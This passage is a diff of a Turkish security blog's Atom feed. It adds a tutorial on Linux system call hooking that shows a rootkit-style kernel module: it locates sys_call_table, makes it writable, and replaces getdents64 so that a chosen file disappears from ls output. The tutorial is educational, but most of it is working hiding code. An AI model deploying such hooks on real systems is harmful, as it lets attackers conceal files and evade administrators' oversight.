@@ -1,4 +1,385 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.2">Jekyll</generator><link href="http://192.168.0.104:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://192.168.0.104:4000/" rel="alternate" type="text/html" /><updated>2019-05-06T19:22:03+03:00</updated><id>http://192.168.0.104:4000/</id><title type="html">Daily Security</title><subtitle>In this blog we're going to solve CTF's &amp; Write Some Software's.My goal is redirect my little knowledge to other people.</subtitle><entry><title type="html">Process Shellcode Injection</title><link href="http://192.168.0.104:4000/2019/04/28/Process-Shellcode-Injection.html" rel="alternate" type="text/html" title="Process Shellcode Injection" /><published>2019-04-28T00:00:00+03:00</published><updated>2019-04-28T00:00:00+03:00</updated><id>http://192.168.0.104:4000/2019/04/28/Process-Shellcode-Injection</id><content type="html" xml:base="http://192.168.0.104:4000/2019/04/28/Process-Shellcode-Injection.html">&lt;h3 id=&quot;process-shellcode-injection&quot;&gt;Process Shellcode Injection&lt;/h3&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.2">Jekyll</generator><link href="http://192.168.254.251:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://192.168.254.251:4000/" rel="alternate" type="text/html" /><updated>2019-05-08T01:48:07+03:00</updated><id>http://192.168.254.251:4000/</id><title type="html">Daily Security</title><subtitle>In this blog we're going to solve CTF's &amp; Write Some Software's.My goal is redirect my little knowledge to other people.</subtitle><entry><title type="html">Linux System Call Hooking</title><link href="http://192.168.254.251:4000/2019/05/07/linux-system-call-hooking.html" rel="alternate" type="text/html" title="Linux System Call Hooking" /><published>2019-05-07T00:00:00+03:00</published><updated>2019-05-07T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/05/07/linux-system-call-hooking</id><content type="html" xml:base="http://192.168.254.251:4000/2019/05/07/linux-system-call-hooking.html">&lt;h1 id=&quot;linux-system-call-hooking&quot;&gt;Linux System Call Hooking&lt;/h1&gt;
+
+&lt;p&gt;Merhaba arkadaşlar &lt;strong&gt;Linux System Call Hooking&lt;/strong&gt; isimli yazıma hoşgeldiniz.&lt;/p&gt;
+
+&lt;p&gt;Bu yazımda sizlere türkçe adı ile &lt;strong&gt;Sistem Çağrısı Kancalama&lt;/strong&gt;‘yı anlatacağım.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;System Call&lt;/strong&gt; nedir kısmına gelmeden önce &lt;strong&gt;rootkit&lt;/strong&gt;‘lerin &lt;strong&gt;System Call Hooking&lt;/strong&gt;‘i neden sıklıkla kullandığını anlatayım.&lt;/p&gt;
+
+&lt;p&gt;Örneğin düşünelim ki bir &lt;strong&gt;Rootkit&lt;/strong&gt; yazdık ve bu &lt;strong&gt;Rootkit&lt;/strong&gt;‘in sistem içerisinde kendini gizlemesi lazım zaten &lt;strong&gt;rootkit&lt;/strong&gt;‘lerin en büyük gereksinimlerinden biri kendini gizlemesi.&lt;/p&gt;
+
+&lt;p&gt;Diyelim ki &lt;strong&gt;ls&lt;/strong&gt; komutu çalıştığında &lt;strong&gt;Rootkit&lt;/strong&gt;‘imiz gösterilmesin istiyoruz. Bunun için bizim &lt;strong&gt;ls&lt;/strong&gt; komutunun içerisindeki &lt;strong&gt;System Call&lt;/strong&gt;‘leri &lt;strong&gt;Hook&lt;/strong&gt; edip &lt;strong&gt;ls&lt;/strong&gt; komutu çalıştığında gelen liste içerisinde bizim komutumuzu gizlemek.&lt;/p&gt;
+
+&lt;p&gt;İlerideki kısımlarda basitce bunu yapacağız ama ondan önce &lt;strong&gt;System Call&lt;/strong&gt; kavramının ne olduğunu öğrenelim.&lt;/p&gt;
+
+&lt;p&gt;Aklınızda ingilizce olarak kalmasını istediğimden buradaki terimleri ingilizce kullanarak devam edicem anlatmaya.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;System Call&lt;/strong&gt;‘lerini aşşağıda ki resimden anlatmaya başlayalım yavaşca :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://www.cs.uregina.ca/Links/class-info/330-bkup/SystemCall_IO/System_Calls.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Öncelike bizim &lt;strong&gt;Executable&lt;/strong&gt;‘ımız &lt;strong&gt;Library Functions&lt;/strong&gt;‘a gider program içerisinde kullanılacak fonksiyonları almak için yada direk olarak &lt;strong&gt;System call&lt;/strong&gt;‘larına başvurur resimde de görebildiğiniz gibi.&lt;/p&gt;
+
+&lt;p&gt;Ayrıca resimde ki okları takip edersek şayet bu &lt;strong&gt;System Call&lt;/strong&gt;‘ların &lt;strong&gt;Kernel&lt;/strong&gt;‘e sonrasında ise &lt;strong&gt;Hardware&lt;/strong&gt;‘e bağlandığını gözlemleyebiliriz.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;System Call&lt;/strong&gt;‘lerin neler olduğunu soracak olursanız aşşağıda bir kaçını listeleyen bir resim bırakıyorum. Tüm sistem çağrılarına yani &lt;strong&gt;System Call&lt;/strong&gt;‘lara ulaşmak istiyorsanız resmin üstüne de fotorafı aldığım web siteyi bırakacağım.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://syscalls.kernelgrok.com/&quot;&gt;Linux Syscall Reference&lt;/a&gt;
+&lt;img src=&quot;https://i.hizliresim.com/MVO54g.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Yani daha basite indirge edersek şayet &lt;strong&gt;System Call&lt;/strong&gt;‘leri bir program içerisinde kullandığımız örneğin &lt;strong&gt;printf&lt;/strong&gt; gibi bir &lt;strong&gt;Library Function&lt;/strong&gt;‘unun sistem’e uyarlanmış halidir.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;System Call&lt;/strong&gt;‘lerini anladığımıza göre &lt;strong&gt;Hooking&lt;/strong&gt; terimine geçebiliriz. Bu terimi daha önce yazdığım blogum olan &lt;a href=&quot;https://blacknbunny.github.io/2019/04/14/Linux-Function-Hooking.html&quot;&gt;Linux Function Hooking&lt;/a&gt; içerisinde anlattım o yüzden bu blogumda anlatmıyacağım.&lt;/p&gt;
+
+&lt;p&gt;Şimdi gelelim bilalin topu kaleye nasıl soktuğuna, pardon pardon bu başka konuydu… yine karıştırdım.&lt;/p&gt;
+
+&lt;p&gt;Gelelim &lt;strong&gt;System Call&lt;/strong&gt;‘lerinin nasıl &lt;strong&gt;Hook&lt;/strong&gt; edildiğine.&lt;/p&gt;
+
+&lt;p&gt;Aslında bu konuda daha önce anlattığım &lt;strong&gt;Function Hooking&lt;/strong&gt;‘e çok benzer bir konu. Aralarında ki bir kaç fark birinin &lt;strong&gt;User-mode&lt;/strong&gt; içerisinde bu yazının ise &lt;strong&gt;Kernel-mode&lt;/strong&gt; içerisinde geçmesi.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/GmdQVV.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Buraya birde &lt;strong&gt;User-mode&lt;/strong&gt; ve &lt;strong&gt;Kernel-mode&lt;/strong&gt; arasındaki farkları anlatan bir stackoverflow çözümünü bırakıyorum : &lt;a href=&quot;https://stackoverflow.com/questions/1311402/what-is-the-difference-between-user-and-kernel-modes-in-operating-systems&quot;&gt;User vs Kernel&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;system-call-trace&quot;&gt;System Call Trace&lt;/h1&gt;
+
+&lt;p&gt;Şayet bir &lt;strong&gt;Executable&lt;/strong&gt; içerisinde bulunan &lt;strong&gt;System Call&lt;/strong&gt;‘leri yakalamak ve incelemek istiyorsak linux içerisinde bulunan &lt;strong&gt;strace&lt;/strong&gt; komutumuz bize çok yardımcı olacaktır.&lt;/p&gt;
+
+&lt;p&gt;Nasıl çalıştığını bilmeyen arkadaşlar için buraya &lt;strong&gt;strace&lt;/strong&gt; komutunu anlatan bir yazı bırakıyorum : &lt;a href=&quot;https://www.tecmint.com/strace-commands-for-troubleshooting-and-debugging-linux/&quot;&gt;Strace&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;ls-komutunu-hook-etme&quot;&gt;LS komutunu hook etme&lt;/h1&gt;
+
+&lt;p&gt;Öncelik ile &lt;strong&gt;ls&lt;/strong&gt; komutunun hangi &lt;strong&gt;System Call&lt;/strong&gt;‘lerini içerdiğini görmek için &lt;strong&gt;strace&lt;/strong&gt; komutunu kullanıyoruz ve çıktımız şu şekilde oluyor :&lt;/p&gt;
+
+&lt;p&gt;Biraz uzun olduğu için pastebin’e ekledim çıktıyı : &lt;a href=&quot;https://pastebin.com/fRjDHF2T&quot;&gt;Strace çıktısı&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Bu çıktının içerisinde gözümüze çarpan bir sürü &lt;strong&gt;System Call&lt;/strong&gt; mevcut olan ve dizin girişlerini alan &lt;strong&gt;getdents64&lt;/strong&gt; sistem çağrısı ilgimizi çekiyor ve &lt;a href=&quot;http://man7.org/linux/man-pages/man2/getdents.2.html&quot;&gt;man page&lt;/a&gt;‘ini incelediğimizde görebiliriz ki :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int getdents(unsigned int fd, struct linux_dirent *dirp,
+                unsigned int count);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;4 adet argüman alıyor ama bu argümanların içerisinde bir &lt;strong&gt;structure&lt;/strong&gt; yani bir yapı olan &lt;strong&gt;linux_dirent64&lt;/strong&gt; diğerlerinden farklı olarak &lt;strong&gt;ls&lt;/strong&gt; komutu çalıştıktan sonra gelen listeyi döndürüyor :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct linux_dirent {
+	unsigned long  d_ino;     /* Inode number */
+	unsigned long  d_off;     /* Offset to next linux_dirent */
+	unsigned short d_reclen;  /* Length of this linux_dirent */
+	char d_name[];  /* Filename (null-terminated) */
+	/* length is actually (d_reclen - 2 -
+	offsetof(struct linux_dirent, d_name)) */
+	/*
+	char pad;       // Zero padding byte
+	char d_type;    // File type (only since Linux
+	// 2.6.4); offset is (d_reclen - 1)
+	*/
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ayrıca man page içerisinde bu &lt;strong&gt;System Call&lt;/strong&gt;‘ın &lt;strong&gt;readdir.c&lt;/strong&gt; içerisinde kullanıldığını görebiliyoruz.&lt;/p&gt;
+
+&lt;p&gt;Artık bundan sonrası &lt;strong&gt;LKM&lt;/strong&gt; yani &lt;strong&gt;Loadable Kernel Module&lt;/strong&gt; development’e giriyor ve bunun ne olduğunu bilmeyen arkadaşlarımız varsa aramızda onlar içinde bir yazı yazdım.&lt;/p&gt;
+
+&lt;p&gt;Buradan ulaşabilirsiniz : &lt;a href=&quot;https://blacknbunny.github.io/2019/04/22/loadable-kernel-module.html&quot;&gt;Loadable Kernel Module Development&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;system-call-hooking-i̇çin-lkm-geliştirmek&quot;&gt;System Call Hooking İçin LKM Geliştirmek&lt;/h1&gt;
+
+&lt;p&gt;&lt;strong&gt;Strace&lt;/strong&gt; komutunu kullanıp &lt;strong&gt;ls&lt;/strong&gt; içerisinden &lt;strong&gt;getdents64&lt;/strong&gt; sistem çağrısını incelersek şayet:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;deadbeef@pop-os:~$ strace ls 2&amp;gt;&amp;amp;1 | grep getdents64
+getdents64(3, /* 30 entries */, 32768)  = 960
+getdents64(3, /* 0 entries */, 32768)   = 0
+deadbeef@pop-os:~$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;30 adet entry olduğunu görebiliriz bulunduğumuz klasör içerisinde. Doğrulamak için de &lt;strong&gt;wc&lt;/strong&gt; komutunu kullanabiliriz :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;deadbeef@pop-os:~$ ls -la | wc -l
+30
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Şimdi elde ettiğimiz tüm bu bilgiler ile &lt;strong&gt;LKM&lt;/strong&gt;‘mizi geliştirmeye başlayalım yavaştan.&lt;/p&gt;
+
+&lt;p&gt;Bu kısımı çok basit anlatacağım aramızda anlamakta zorlanan arkadaşlar olur diye.&lt;/p&gt;
+
+&lt;p&gt;Ve tam anlatmaya başlarken kız arkadaşım kabus görüp kalkıyor.&lt;/p&gt;
+
+&lt;p&gt;Evet onu yatıştırdıktan sonra yazıya devam edebilirim.&lt;/p&gt;
+
+&lt;p&gt;Öncelikle kütüphanelerimizi ekleyelim :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;linux/module.h&amp;gt;
+#include &amp;lt;linux/init.h&amp;gt;
+#include &amp;lt;linux/kernel.h&amp;gt;
+#include &amp;lt;linux/moduleparam.h&amp;gt;
+#include &amp;lt;linux/unistd.h&amp;gt;
+#include &amp;lt;linux/semaphore.h&amp;gt;
+#include &amp;lt;linux/dirent.h&amp;gt;
+#include &amp;lt;asm/cacheflush.h&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Sonrasında yazacağımız &lt;strong&gt;LKM&lt;/strong&gt;‘nin detaylarını girelim :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MODULE_AUTHOR(&quot;blacknbunny&quot;);
+MODULE_DESCRIPTION(&quot;LS Komutundan cokgizlidosya.txt yi gizlemek&quot;);
+MODULE_LICENSE(&quot;GPL&quot;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;İleride daha detaylı anlatacağım &lt;strong&gt;sys_call_table&lt;/strong&gt; :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void **sys_call_table;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;LS&lt;/strong&gt; komutundan saklayacağımız dosya :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define DOSYA_ISMI &quot;cokgizlidosya.txt&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Orjinal &lt;strong&gt;getdents64&lt;/strong&gt; sistem çağrısı :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;asmlinkage int (*org_getdents64) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Bu orjinal sistem çağrısı yerine bizim aktaracağımız hookumuz :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
+{
+        int returnval;
+        struct linux_dirent64 *cur = dirp;
+        int i = 0;
+        returnval = org_getdents64(fd, dirp, count);
+        while (i &amp;lt; returnval) {
+                if (strncmp(cur-&amp;gt;d_name, DOSYA_ISMI, strlen(DOSYA_ISMI)) == 0) {
+                        int reclen = cur-&amp;gt;d_reclen;
+                        char *next_rec = (char *)cur + reclen;
+                        int len = (int)dirp + returnval - (int)next_rec;
+                        memmove(cur, next_rec, len);
+                        returnval -= reclen;
+                        continue;
+                }
+                i += cur-&amp;gt;d_reclen;
+                cur = (struct linux_dirent*) ((char*)dirp + i);
+        }
+        return returnval;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tüm bilgileri toplayıp birleştirdikten sonra bu hooku yazdım.&lt;/p&gt;
+
+&lt;p&gt;Hooku basitce açıklayacak olursam. &lt;strong&gt;linux_dirent64&lt;/strong&gt; &lt;strong&gt;struct&lt;/strong&gt;‘u üzerinde bir döngü oluşturduk ve her bir dosya ismini aradık.&lt;/p&gt;
+
+&lt;p&gt;Bizim belirttiğimiz gizlenilecek dosya ile aynı ismi taşıyorsa bunu &lt;strong&gt;ls&lt;/strong&gt; komutunda gösterme dedik.&lt;/p&gt;
+
+&lt;h1 id=&quot;system-call-table&quot;&gt;System Call Table&lt;/h1&gt;
+&lt;p&gt;Şimdi geldik değirmenin döndüğü yere.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;System Call Table&lt;/strong&gt; yani &lt;strong&gt;sys_call_table&lt;/strong&gt; kernelin içerdiği tüm sistem çağrılarını tutar. Aynı zamanda &lt;strong&gt;hafıza&lt;/strong&gt; yani &lt;strong&gt;memory&lt;/strong&gt; içerisinde nerede olduğunu bize gösterir.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;System Call Table&lt;/strong&gt;‘nin adresini linux içerisinde bulmamız gerek ki gerçek &lt;strong&gt;System Call&lt;/strong&gt; ile bizim yazdığımız sahte &lt;strong&gt;Hook&lt;/strong&gt; sistem çağrısını değiştirebilelim.&lt;/p&gt;
+
+&lt;p&gt;Ve bu şekilde her &lt;strong&gt;ls&lt;/strong&gt; komutu çalıştığında gerçek &lt;strong&gt;getdents64&lt;/strong&gt; sistem çağrısı yerine bizim &lt;strong&gt;hook_getdents64&lt;/strong&gt; sistem çağrımız çalışıcak.&lt;/p&gt;
+
+&lt;p&gt;Yazdığımız hook belirttiğimiz dosyayı gizlemeye yaradığından &lt;strong&gt;ls&lt;/strong&gt; komutu çalıştığında hiçbir şekilde görülemeyecek.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;sys_call_table&lt;/strong&gt;‘nin adresini bulmak için &lt;strong&gt;/boot&lt;/strong&gt; içerisinde bulunan &lt;strong&gt;System.map&lt;/strong&gt;‘e bakmamız gerekiyor :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;deadbeef@pop-os:~$ sudo grep sys_call_table /boot/System.map-`uname -r`
+ffffffff820001c0 R sys_call_table
+ffffffff820015a0 R ia32_sys_call_table
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ve bu şekilde &lt;strong&gt;sys_call_table&lt;/strong&gt;‘mizin adresini bulduk &lt;strong&gt;ffffffff820001c0&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Şimdide bu &lt;strong&gt;sys_call_table&lt;/strong&gt;‘ı yazılabilir yapmamız gerek ki asıl sistem çağrısı ile bizim sahte yani &lt;strong&gt;Hook&lt;/strong&gt; sistem çağrısını değiştirebilelim.&lt;/p&gt;
+
+&lt;p&gt;Bunuda yapmak için vereceğimiz &lt;strong&gt;sys_call_table&lt;/strong&gt; adresinin &lt;strong&gt;table entry&lt;/strong&gt;‘sini &lt;strong&gt;manual&lt;/strong&gt; olarak writable yapmamız gerek.&lt;/p&gt;
+
+&lt;p&gt;Bu stackoverflow sorusunun cevaplarında bunu yapmak için bir sürü teknik var bakmak isterseniz : &lt;a href=&quot;https://stackoverflow.com/questions/2103315/linux-kernel-system-call-hooking-example&quot;&gt;StackOverflow sys_call_table&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Bunuda &lt;strong&gt;lookup_address&lt;/strong&gt; fonksiyonu ile &lt;strong&gt;page table&lt;/strong&gt;‘nin adresini bulup sonrasında içerisinde &lt;strong&gt;sys_call_table&lt;/strong&gt;‘ye yazma yetkisi vermeliyiz :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int set_page_rw(unsigned long addr)
+{
+  unsigned int level;
+  pte_t *pte = lookup_address(addr, &amp;amp;level);
+  if (pte-&amp;gt;pte &amp;amp;~ _PAGE_RW) pte-&amp;gt;pte |= _PAGE_RW;
+  return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Günün sonunda bu yazdığımız &lt;strong&gt;LKM&lt;/strong&gt;‘yi &lt;strong&gt;kernel&lt;/strong&gt;‘e yükleyeceğiz fakat sonrasında bunu sildiğimizde herşeyin tekrar aynı haline dönmesi olayıda var birde.&lt;/p&gt;
+
+&lt;p&gt;Bunun içinde eğer &lt;strong&gt;sys_call_table&lt;/strong&gt;‘yi tekrardan &lt;strong&gt;Read-Only&lt;/strong&gt; yapmak istiyorsak yine aynı tekniği kullanabiliriz :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int set_page_ro(unsigned long addr)
+{
+  unsigned int level;
+  pte_t *pte = lookup_address(addr, &amp;amp;level);
+  pte-&amp;gt;pte = pte-&amp;gt;pte &amp;amp;~_PAGE_RW;
+  return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Yetkilendirmeleri merak edenler varsa &lt;strong&gt;arch/x86/include/asm/pgtable_types.h&lt;/strong&gt; içerisinden küçük bir liste :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define _PAGE_BIT_PRESENT       0       /* is present */
+#define _PAGE_BIT_RW            1       /* writeable */
+#define _PAGE_BIT_USER          2       /* userspace addressable */
+#define _PAGE_BIT_PWT           3       /* page write through */
+#define _PAGE_BIT_PCD           4       /* page cache disabled */
+#define _PAGE_BIT_ACCESSED      5       /* was accessed (raised by CPU) */
+#define _PAGE_BIT_DIRTY         6       /* was written to (raised by CPU) */
+#define _PAGE_BIT_PSE           7       /* 4 MB (or 2MB) page */
+#define _PAGE_BIT_PAT           7       /* on 4KB pages */
+#define _PAGE_BIT_GLOBAL        8       /* Global TLB entry PPro+ */
+#define _PAGE_BIT_UNUSED1       9       /* available for programmer */
+#define _PAGE_BIT_IOMAP         10      /* flag used to indicate IO mapping */
+#define _PAGE_BIT_HIDDEN        11      /* hidden by kmemcheck */
+#define _PAGE_BIT_PAT_LARGE     12      /* On 2MB or 1GB pages */
+#define _PAGE_BIT_SPECIAL       _PAGE_BIT_UNUSED1
+#define _PAGE_BIT_CPA_TEST      _PAGE_BIT_UNUSED1
+#define _PAGE_BIT_SPLITTING     _PAGE_BIT_UNUSED1 /* only valid on a PSE pmd */
+#define _PAGE_BIT_NX           63       /* No execute: only valid after cpuid check */
+#define _PAGE_PRESENT   (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_PRESENT)
+#define _PAGE_RW        (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_RW)
+#define _PAGE_USER      (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_USER)
+#define _PAGE_PWT       (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_PWT)
+#define _PAGE_PCD       (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_PCD)
+#define _PAGE_ACCESSED  (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_ACCESSED)
+#define _PAGE_DIRTY     (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_DIRTY)
+#define _PAGE_PSE       (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_PSE)
+#define _PAGE_GLOBAL    (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_GLOBAL)
+#define _PAGE_UNUSED1   (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_UNUSED1)
+#define _PAGE_IOMAP     (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_IOMAP)
+#define _PAGE_PAT       (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_PAT)
+....
+#define _PAGE_PAT_LARGE (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_PAT_LARGE)
+#define _PAGE_SPECIAL   (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_SPECIAL)
+#define _PAGE_CPA_TEST  (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_CPA_TEST)
+#define _PAGE_SPLITTING (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_SPLITTING)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Modül yüklendiğinde yani &lt;strong&gt;insmod&lt;/strong&gt; çalıştığında :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static int __init getdents_hook_init(void)
+{
+
+  sys_call_table = (void*)0xffffffff820001c0;
+  org_getdents64 = sys_call_table[__NR_getdents64];
+
+  set_page_rw(sys_call_table);
+  sys_call_table[__NR_getdents64] = hook_getdents64;
+        return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;LKM&lt;/strong&gt;‘mizi oluşturup &lt;strong&gt;kernel&lt;/strong&gt;‘e dahil ettikten sonra çalışacak fonksiyon.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;ÖNEMLİ&lt;/strong&gt; : Buradaki &lt;strong&gt;sys_call_table = (void*)0xsizinsyscalltableadresiniz;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Kısmını kendi &lt;strong&gt;sys_call_table&lt;/strong&gt; adresiniz ile değiştirmeniz gerekli.&lt;/p&gt;
+
+&lt;p&gt;Nasıl bulacağınızı yukarıda anlatmıştım eğer blog içerisinde bulamadıysanız hemen &lt;strong&gt;CTRL + F&lt;/strong&gt; yapıp &lt;strong&gt;System.map&lt;/strong&gt; bunu arayın orada &lt;strong&gt;sys_call_table&lt;/strong&gt; adresinin nasıl bulunacağını anlattım.&lt;/p&gt;
+
+&lt;p&gt;Şimdi geldik eğer bunu silmek istersek kısmına :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static void __exit getdents_hook_exit(void)
+{
+  sys_call_table[__NR_getdents64] = org_getdents64;
+  set_page_ro(sys_call_table);
+        return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Eğer oluşturduğumuz &lt;strong&gt;LKM&lt;/strong&gt;‘yi silersek oluşturduğumuz sahte &lt;strong&gt;Hook&lt;/strong&gt; fonksiyonunu &lt;strong&gt;sys_call_table&lt;/strong&gt;‘den çıkartıp herşeyi tekrar eski haline çevirmesini söylüyoruz programımıza aynı zamanda &lt;strong&gt;table entry&lt;/strong&gt;‘ide tekrardan &lt;strong&gt;Read-Only&lt;/strong&gt; yapıyoruz.&lt;/p&gt;
+
+&lt;p&gt;Şimdi tüm bu yazdığımız kodları tek bir bütün haline almaya geldi sıra hepsini pastebine yüklüyorum. İçerisinden değiştirmeniz gereken tek kısım &lt;strong&gt;sys_call_table&lt;/strong&gt; adresi.&lt;/p&gt;
+
+&lt;p&gt;Kod : &lt;a href=&quot;https://pastebin.com/a4MF1J7T&quot;&gt;System Call Hooking Code&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;make&quot;&gt;Make&lt;/h1&gt;
+&lt;p&gt;Şimdi sıra geldi bu kodu derlemeye.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Makefile&lt;/strong&gt; isminde bir dosya oluşturun ve yukarıda yazdığımız kodu nasıl kaydettiyseniz burada bulunan &lt;strong&gt;syscallhook.o&lt;/strong&gt; ismini onunla değiştiriniz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;obj-m += syscallhook.o
+
+all:
